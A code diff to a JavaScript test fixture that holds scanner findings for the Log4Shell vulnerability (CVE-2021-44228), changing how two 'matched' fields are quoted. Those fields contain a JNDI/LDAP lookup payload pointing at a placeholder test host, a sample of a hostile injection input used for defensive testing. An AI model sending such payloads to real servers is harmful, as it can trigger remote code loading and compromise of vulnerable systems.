@@ -12,8 +12,8 @@ const fixtureNdjson = [
 			reference: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
 		},
 		host: "https://example.com",
-		matched: String.raw`https://example.com/?x=${"jndi:ldap://test.example.com/a"}`,
-		"matched-at": String.raw`https://example.com/?x=${"jndi:ldap://test.example.com/a"}`,
+		matched: `https://example.com/?x=${"jndi:ldap://test.example.com/a"}`,
+		"matched-at": `https://example.com/?x=${"jndi:ldap://test.example.com/a"}`,
 		description: "Apache Log4j2 <=2.14.1 JNDI features do not protect against attacker-controlled LDAP.",
 	}),
 	JSON.stringify({
